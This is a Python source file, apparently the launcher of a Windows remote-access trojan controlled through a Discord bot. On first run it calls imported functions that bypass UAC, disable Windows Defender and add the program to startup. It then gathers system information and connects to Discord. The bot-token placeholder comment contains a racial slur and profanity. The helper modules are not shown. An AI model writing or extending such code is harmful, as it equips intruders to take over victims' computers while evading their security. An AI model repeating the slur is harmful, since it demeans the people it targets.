import os
import sys
import logging
from defender_bypass import disable_defender
from uac_bypass import bypass_uac
from discord_bot import CLIENT
from utils import add_to_startup, remove_from_startup, get_system_info, ping, traceroute

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")

def first_time_setup():
    """Führt die Erstkonfiguration durch (nur beim ersten Start)."""
    if not os.path.exists("setup_complete.txt"):
        logging.info("[INFO] Performing first-time setup...")

        logging.info("[INFO] Attempting UAC bypass...")
        bypass_uac()

        logging.info("[INFO] Attempting Windows Defender bypass...")
        disable_defender()

        logging.info("[INFO] Adding to startup...")
        add_to_startup()

        with open("setup_complete.txt", "w") as f:
            f.write("Setup complete")
        logging.info("[INFO] First-time setup complete.")

def main():
    logging.info("[INFO] Starting client...")
    try:
        first_time_setup()

        system_info = get_system_info()
        logging.info(f"[INFO] System Info: {system_info}")

        logging.info("[INFO] Performing network diagnostics...")
        ping_result = ping("google.com")
        logging.info(f"[INFO] Ping Result: {ping_result}")
        traceroute_result = traceroute("google.com")
        logging.info(f"[INFO] Traceroute Result: {traceroute_result}")

        logging.info("[INFO] Starting Discord bot...")
        CLIENT.run("Replace me Nigger") # <--- But your Shitty token here
    except Exception as e:
        logging.error(f"[ERROR] Failed to start client: {e}")

if __name__ == "__main__":
    if sys.platform == "win32":
        import ctypes
    main()